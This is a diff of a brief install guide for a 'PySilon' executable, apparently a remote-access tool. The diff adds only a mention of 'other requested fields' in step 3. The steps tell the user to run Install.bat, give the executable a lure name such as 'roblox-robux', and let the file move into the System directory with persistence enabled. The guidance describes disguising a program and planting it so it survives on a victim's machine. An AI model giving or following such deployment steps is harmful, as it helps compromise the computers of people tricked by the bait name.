@@ -3,7 +3,7 @@
 
 2º step: Place your PySilon executable in the 'files' folder.
 
-3º step: Start "Install.bat" and write your executable name without the file extension.
+3º step: Start "Install.bat" and write your executable name without the file extension and other requested fields.
 - Example: If your file is called "roblox-robux.exe" you should type "roblox-robux"
 
 4º step: Wait and your file will be moved to the System directory and persisting tasks will be enabled.
